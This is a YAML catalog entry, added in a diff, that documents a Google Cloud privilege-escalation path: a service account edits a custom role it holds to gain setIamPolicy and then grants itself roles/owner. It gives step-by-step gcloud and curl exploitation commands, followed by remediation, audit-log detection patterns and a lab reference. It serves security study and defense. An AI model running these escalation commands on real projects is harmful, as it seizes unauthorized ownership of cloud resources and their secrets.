@@ -1,0 +1,200 @@
+id: gcp-iam-003
+name: iam.roles.update
+category: self-escalation
+services:
+  - iam
+permissions:
+  required:
+    - permission: iam.roles.update
+      resourceConstraints: Must be granted on a project custom role that the attacker's principal is also a member of, enabling the principal to edit the role it holds
+  additional:
+    - permission: iam.roles.get
+      resourceConstraints: "Required only by `gcloud iam roles update --add-permissions`, which reads the role's current `includedPermissions` before writing the appended list; not needed via the raw `roles.patch` REST API, which replaces `includedPermissions` wholesale"
+    - permission: iam.roles.list
+      resourceConstraints: Helpful for enumerating project custom roles to identify which bound role is editable
+    - permission: resourcemanager.projects.get
+      resourceConstraints: Helpful for confirming the current project context and the lack of direct admin roles
+    - permission: resourcemanager.projects.getIamPolicy
+      resourceConstraints: "Required only by `gcloud projects add-iam-policy-binding`, which reads the project IAM policy before writing it back; not needed via the raw `setIamPolicy` REST API"
+description: "A principal bound to a project custom role that also grants `iam.roles.update` on that role can edit the role's `includedPermissions` to add any permission -- most critically `resourcemanager.projects.setIamPolicy`. Because the principal is a member of the role, it instantly inherits the newly-added permission after IAM propagation. It then uses `resourcemanager.projects.setIamPolicy` to self-bind `roles/owner` on the project, achieving full project administrator access. The key vulnerability is the self-reference: the principal holds the role and can update the role, turning a least-privilege custom role into an open-ended permission vending machine."
+prerequisites:
+  - A project custom role must exist that includes `iam.roles.update` on itself
+  - The attacker's principal must be a member of (bound to) that same custom role
+exploitationSteps:
+  gcloud:
+    - step: 1
+      command: |
+        gcloud iam roles list \
+          --project=PROJECT_ID
+      description: Enumerate project custom roles to identify a role the attacker is bound to and can update. This reconnaissance requires the additional `iam.roles.list` permission.
+    - step: 2
+      command: |
+        gcloud iam roles describe CUSTOM_ROLE_ID \
+          --project=PROJECT_ID
+      description: "Describe the editable custom role to confirm it grants `iam.roles.update`. This requires the additional `iam.roles.get` permission, which `gcloud iam roles update --add-permissions` also calls internally in step 3."
+    - step: 3
+      command: |
+        gcloud iam roles update CUSTOM_ROLE_ID \
+          --project=PROJECT_ID \
+          --add-permissions=resourcemanager.projects.setIamPolicy
+      description: "Add `resourcemanager.projects.setIamPolicy` to the custom role. Because the attacker is a member of this role, they instantly inherit the newly-added permission after IAM propagation (~15 seconds). `gcloud iam roles update --add-permissions` reads the role first (`iam.roles.get`), so it requires that additional permission."
+    - step: 4
+      command: |
+        gcloud projects add-iam-policy-binding PROJECT_ID \
+          --member=serviceAccount:ATTACKER_SA@PROJECT_ID.iam.gserviceaccount.com \
+          --role=roles/owner
+      description: "Self-bind `roles/owner` on the project using the newly-acquired `resourcemanager.projects.setIamPolicy` permission. `gcloud projects add-iam-policy-binding` reads the project IAM policy first (`resourcemanager.projects.getIamPolicy`), so it requires that additional permission."
+    - step: 5
+      command: |
+        gcloud PROJECT_RESOURCE_COMMAND \
+          --project=PROJECT_ID
+      description: Run any Google Cloud command as the escalated principal, which now holds `roles/owner` on the project
+  curl:
+    - step: 1
+      command: |
+        curl -sS -X PATCH \
+          -H "Authorization: Bearer $TOKEN" \
+          -H "Content-Type: application/json" \
+          -d '{
+            "includedPermissions": [
+              "iam.roles.update",
+              "resourcemanager.projects.setIamPolicy"
+            ]
+          }' \
+          "https://iam.googleapis.com/v1/projects/PROJECT_ID/roles/CUSTOM_ROLE_ID?updateMask=includedPermissions"
+      description: "Add `resourcemanager.projects.setIamPolicy` to the custom role by PATCHing its `includedPermissions` via the raw `roles.patch` API. Unlike `gcloud iam roles update --add-permissions`, this replaces the entire permission list without reading the role first, so `iam.roles.get` is not required. Include all existing permissions in the list to avoid removing them."
+    - step: 2
+      command: |
+        curl -sS -X POST \
+          -H "Authorization: Bearer $TOKEN" \
+          -H "Content-Type: application/json" \
+          -d '{
+            "policy": {
+              "bindings": [
+                EXISTING_BINDINGS,
+                {
+                  "role": "roles/owner",
+                  "members": ["serviceAccount:ATTACKER_SA@PROJECT_ID.iam.gserviceaccount.com"]
+                }
+              ]
+            }
+          }' \
+          "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID:setIamPolicy"
+      description: "Self-bind `roles/owner` on the project using the raw `setIamPolicy` REST API. Unlike `gcloud projects add-iam-policy-binding`, this does not require a prior `getIamPolicy` read -- but including existing bindings in the policy body is recommended to avoid removing them."
+    - step: 3
+      command: |
+        curl -H "Authorization: Bearer $TOKEN" \
+          "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID"
+      description: Verify `roles/owner` access by querying the project as the escalated principal
+recommendation: |
+  Granting `iam.roles.update` to a principal that is also a member of the updated role creates a self-referential escalation path -- the principal can add any permission to the role and instantly inherit it, making the custom role boundary meaningless.
+
+  - **Never bind a principal to a custom role it can also update** - Break the self-reference. If a principal must administer roles, ensure it is not itself a member of the roles it can edit. Keep role-administration permissions in a separate, tightly-held identity.
+  - **Restrict `iam.roles.update` to dedicated administrators** - Treat role-editing permissions as administrative. Use predefined roles like `roles/iam.roleAdmin` only for break-glass or platform-team identities, never for workload service accounts.
+  - **Use IAM Conditions to scope role-administration bindings** - Add time-bound or resource-constrained conditions so standing, unconditional role-edit access is not granted:
+
+  ```json
+  {
+    "role": "roles/iam.roleAdmin",
+    "members": ["serviceAccount:platform-admin@PROJECT_ID.iam.gserviceaccount.com"],
+    "condition": {
+      "title": "time-bound-role-admin",
+      "expression": "request.time < timestamp(\"2026-12-31T00:00:00Z\")"
+    }
+  }
+  ```
+
+  - **Monitor for changes to custom role `includedPermissions`** - Especially additions of high-impact permissions such as `resourcemanager.projects.setIamPolicy`, `iam.serviceAccounts.getAccessToken`, or `iam.serviceAccounts.setIamPolicy`.
+  - Monitor Cloud Audit Logs for `iam.googleapis.com/UpdateRole` events where the modification adds high-impact permissions and the caller is a member of the updated role -- the signature of this self-escalation.
+  - Monitor for `cloudresourcemanager.googleapis.com/SetIamPolicy` events that add `roles/owner` or `roles/editor` bindings, especially when the member being added is the same identity making the call (self-binding).
+  - Monitor for the sequential pattern: `UpdateRole` adding `resourcemanager.projects.setIamPolicy`, followed within seconds by a `SetIamPolicy` self-binding `roles/owner`, followed by access to previously-denied resources.
+  - Use Policy Analyzer / IAM Recommender to identify identities that hold effective `iam.roles.update` on a custom role they are also bound to -- the core of this vulnerability.
+limitations: |
+  This path requires the specific combination of (1) the attacker being a member of a custom role and (2) that same custom role granting `iam.roles.update` on itself. If the custom role grants `iam.roles.update` on a different role that the attacker does not hold, editing it does not directly benefit the attacker.
+
+  `resourcemanager.projects.setIamPolicy` is not a starting permission -- it is manufactured mid-attack by editing the custom role. Detection based solely on starting permissions would miss this path; effective detection must model the permissions an identity can grant itself.
+
+  After self-binding `roles/owner`, the attacker has full project administrator access. `roles/owner` includes `secretmanager.versions.access`, so unlike `roles/editor`, no additional `secretAccessor` grant is needed to read Secret Manager payloads.
+discoveryAttribution:
+  firstDocumented:
+    author: Spencer Gietzen
+    organization: Rhino Security Labs
+    date: 2020
+    link: https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
+references:
+- title: Privilege Escalation in Google Cloud Platform - Part 1 (IAM) - Rhino Security Labs
+  url: https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
+- title: RhinoSecurityLabs/GCP-IAM-Privilege-Escalation - iam.roles.update exploit script
+  url: https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.roles.update.py
+- title: GCP - IAM Privesc - HackTricks Cloud
+  url: https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-iam-privesc.html
+- title: GCPwn UPDATE_CUSTOM_ROLE_ADD_PERMISSIONS OpenGraph edge - Scott Weston / NetSPI
+  url: https://github.com/NetSPI/gcpwn/blob/acabc59d87fdc5dca86d919aa72faf7a628e2e9a/gcpwn/mappings/og_defined_edges.json#L68-L87
+detectionTools:
+  gcpwn: https://github.com/NetSPI/gcpwn/blob/main/gcpwn/mappings/og_defined_edges.json#L81
+  rhino-gcp-privesc: https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/PrivEscScanner/check_for_privesc.py#L8
+relatedPaths:
+  - gcp-iam-001
+  - gcp-iam-002
+learningEnvironments:
+  pathfinding-labs:
+    type: open-source
+    githubLink: https://github.com/DataDog/pathfinding-labs
+    scenario: modules/scenarios/gcp/single-account/privesc-self-escalation/to-admin/gcp-iam-003-iam-rolesupdate
+    description: "Deploy Terraform into your own GCP project to practice this attack path"
+attackVisualization:
+  nodes:
+    - id: start
+      label: Starting Service Account
+      type: principal
+      description: |
+        The attacker's starting service account. It holds no project-level roles of its own (no `roles/owner`, `roles/editor`, etc.), but it is bound to a project custom role that grants `iam.roles.update` on that same role. This self-referential binding is the core vulnerability: the SA can edit the permissions of the role it holds, effectively granting itself arbitrary permissions.
+
+    - id: custom_role
+      label: Editable Custom Role
+      type: resource
+      description: |
+        A project custom role (e.g., `gcp_iam_003_editable`) that the starting service account is bound to. The role initially grants only `iam.roles.update` (scoped to itself), but because the SA can edit its `includedPermissions`, the role becomes a permission vending machine. The attacker adds `resourcemanager.projects.setIamPolicy` to the role, and the SA instantly inherits it after IAM propagation (~15 seconds).
+
+    - id: admin
+      label: Effective Administrator
+      type: outcome
+      description: |
+        The starting service account has self-bound `roles/owner` on the project using the `resourcemanager.projects.setIamPolicy` permission it manufactured by editing its own custom role. It now has full project administrator access, including `secretmanager.versions.access` (unlike `roles/editor`, which excludes it). The entire escalation is performed by a single principal with no lateral movement.
+
+  edges:
+    - from: start
+      to: custom_role
+      label: iam.roles.update
+      description: |
+        The starting service account calls `iam.roles.update` on the custom role it is bound to, adding `resourcemanager.projects.setIamPolicy` to the role's `includedPermissions`. This is the key self-referential action: the SA edits the very role it holds.
+
+        Command:
+        ```bash
+        gcloud iam roles update CUSTOM_ROLE_ID \
+          --project=PROJECT_ID \
+          --add-permissions=resourcemanager.projects.setIamPolicy
+        ```
+
+        The `gcloud iam roles update --add-permissions` variant requires the additional `iam.roles.get` permission (it reads the role first). The raw `roles.patch` REST API replaces `includedPermissions` wholesale and does not require `iam.roles.get`.
+
+    - from: custom_role
+      to: start
+      label: Inherits new permissions
+      description: |
+        Because the starting service account is a member of the custom role, it instantly inherits `resourcemanager.projects.setIamPolicy` after IAM propagation (~15 seconds). No additional API call is needed -- the permission is granted automatically through the existing role binding. The SA now holds a permission it was never explicitly granted; it manufactured it by editing its own role.
+
+    - from: start
+      to: admin
+      label: resourcemanager.projects.setIamPolicy
+      description: |
+        The starting service account uses the newly-inherited `resourcemanager.projects.setIamPolicy` permission to self-bind `roles/owner` on the project. This is a single API call that adds the SA to the project IAM policy with the `roles/owner` role.
+
+        Command:
+        ```bash
+        gcloud projects add-iam-policy-binding PROJECT_ID \
+          --member=serviceAccount:ATTACKER_SA@PROJECT_ID.iam.gserviceaccount.com \
+          --role=roles/owner
+        ```
+
+        After IAM propagation, the SA has full project administrator access. `roles/owner` includes `secretmanager.versions.access`, so no additional grant is needed to read Secret Manager payloads.
